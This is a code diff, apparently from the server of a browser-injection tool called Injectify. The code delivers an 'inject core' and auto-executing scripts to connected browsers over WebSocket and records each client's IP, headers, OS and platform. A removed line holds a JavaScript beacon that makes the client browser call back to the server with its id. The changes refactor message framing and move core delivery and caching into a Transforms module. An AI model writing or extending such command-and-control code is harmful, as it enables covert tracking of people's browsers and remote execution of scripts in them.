@@ -1,17 +1,19 @@
 declare var global: any
-
-import { Database } from '../database/definitions/database'
-import { SocketSession } from './definitions/session'
-
-import ClientInfo from './ClientInfo'
-import InjectAPI from './InjectAPI'
 import chalk from 'chalk'
+import { Request } from 'express'
 const { RateLimiter } = require('limiter')
 const atob = require('atob')
 const getIP = require('../lib/getIP.js')
 const uuidv4 = require('uuid/v4')
 const WebSocket = require('ws')
 const pako = require('pako')
+
+import { Database } from '../database/definitions/database'
+import { SocketSession } from './definitions/session'
+
+import ClientInfo from './ClientInfo'
+import InjectAPI from './InjectAPI'
+import { Transforms } from './Transforms'
 
 export default class {
   db: any
@@ -106,6 +108,7 @@ class Session {
   req: Request
   authReq: Request
   client: any
+  cached = false
   core: { bundle: string; hash: string }
 
   constructor(socket: any, req: any, session: SocketSession.session) {
@@ -130,35 +133,37 @@ class Session {
   }
 
   send(topic: string, data: any) {
-    let json = JSON.stringify({
-      t: topic,
-      d: data
-    })
+    /**
+     * Enhanced transport
+     */
+    const json = JSON.stringify(data)
+    let transport = `${topic}${json ? ':' + json : ''}`
     if (
       global.config.compression &&
       !this.session.debug &&
       !/^core|auth$/.test(topic)
     ) {
-      json =
+      transport =
         '#' +
-        pako.deflate(json, {
+        pako.deflate(transport, {
           to: 'string'
         })
     }
     try {
-      this.socket.send(json)
+      /**
+       * Basic RAW transport
+       */
+      if (/^core|auth$/.test(topic)) {
+        transport = data
+      }
+      this.socket.send(transport)
     } catch (error) {
       if (this.socket.readyState !== WebSocket.OPEN) this.socket.close()
     }
   }
 
   auth(id: string) {
-    this.send(
-      'auth',
-      `var X=(window.ws||window.i‍).url.split('/'),V='https://';'ws:'===X[0]&&(V='http://'),X=V+X[2];var M=new Image;M.src=X+'/a?id=${encodeURIComponent(
-        id
-      )}&z=${uuidv4()}',M.onload;`
-    )
+    this.send('auth', Transforms.auth(id, this.core.hash))
     global.inject.authenticate[id] = (token: string, req) =>
       this.authorized(token, req)
   }
@@ -174,7 +179,7 @@ class Session {
     )
     let limiterLimiter = new RateLimiter(50, 15000, true)
 
-    this.socket.on('message', (raw) => {
+    this.socket.on('message', (raw: string) => {
       let { tokens } = global.config.rateLimiting.inject
       let token = 1
       let topic: string
@@ -215,7 +220,13 @@ class Session {
           }
         }
         try {
-          raw = JSON.parse(raw)
+          const separator = raw.indexOf(':')
+          if (separator > -1) {
+            topic = raw.substring(0, separator)
+            data = JSON.parse(raw.substring(separator + 1))
+          } else {
+            topic = raw
+          }
         } catch (e) {
           if (global.config.debug)
             console.error(
@@ -228,9 +239,6 @@ class Session {
             )
           return
         }
-        if (typeof raw.t !== 'string') return
-        topic = raw.t
-        data = raw.d
       } catch (e) {
         if (global.config.debug)
           console.error(
@@ -327,22 +335,42 @@ class Session {
       }
 
       /**
-       * Send the inject core
+       * Client side variables
        */
-      let socketHeaders = this.req.headers
-      delete socketHeaders['user-agent']
-      let core = this.core.bundle
-        .replace('client.ip', JSON.stringify(client.ip))
-        .replace('client.id', JSON.stringify(session.id))
-        .replace('client.agent', JSON.stringify(client.agent))
-        .replace('client.headers', JSON.stringify(socketHeaders))
-        .replace('client.platform', JSON.stringify(client.platform))
-        .replace('client.os', JSON.stringify(client.os))
-        .replace(
-          'client.compression',
-          this.session.debug ? `false` : `${!!global.config.compression}`
-        )
-      this.send('core', core)
+      const variables = {
+        __client: {
+          ip: client.ip,
+          id: session.id,
+          agent: client.agent,
+          headers: {
+            ...this.req.headers,
+            'user-agent': undefined
+          },
+          platform: client.platform,
+          os: client.os
+        },
+        __server: {
+          compression: this.session.debug ? false : !!global.config.compression,
+          version: this.core.hash,
+          cached: false
+        }
+      }
+
+      /**
+       * Deliver the Injectify Core
+       */
+      if (this.authReq.query.t === '1') {
+        /**
+         * Client has the current version of the Core cached
+         */
+        variables.__server.cached = true
+        this.send('core', Transforms.cache(variables))
+      } else {
+        /**
+         * Core loader
+         */
+        this.send('core', Transforms.core(this.core, variables))
+      }
 
       /**
        * Send the auto-execute script
